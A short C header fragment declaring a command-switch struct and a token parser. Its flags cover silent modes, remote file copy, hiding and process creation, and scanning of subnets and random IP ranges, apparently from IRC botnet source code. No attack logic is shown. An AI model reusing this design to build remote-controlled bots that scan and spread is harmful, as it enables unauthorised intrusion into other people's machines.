typedef struct PARAMS
{
	BOOL silent;
	BOOL halfsilent;
	BOOL verbose;
	BOOL stop;
	BOOL force;
	BOOL replace_underscores;//for .file copy/move
	char replace_char;
	BOOL createwait;//for .file createproc
	BOOL overwrite;//for .file copy
	BOOL attrib_system;//for .file attrib
	BOOL attrib_hidden;//for .file attrib
	BOOL attrib_readonly;//for .file attrib
	BOOL attrib_normal;//for .file attrib
	BOOL scan_a;//use a class subnet
	BOOL scan_b;//use b class subnet
	BOOL scan_c;//use c class subnet
	BOOL scan_r;//scan random ranges
	BOOL scan_e;//use external ip
	
	BOOL netstat_noresolve;
	BOOL netstat_all;

	BOOL speedtest_reset;
} SWITCHES;

SWITCHES GetSwitches(char *a[MAX_TOKENS],int t);
void HookProtocol(void *conn);
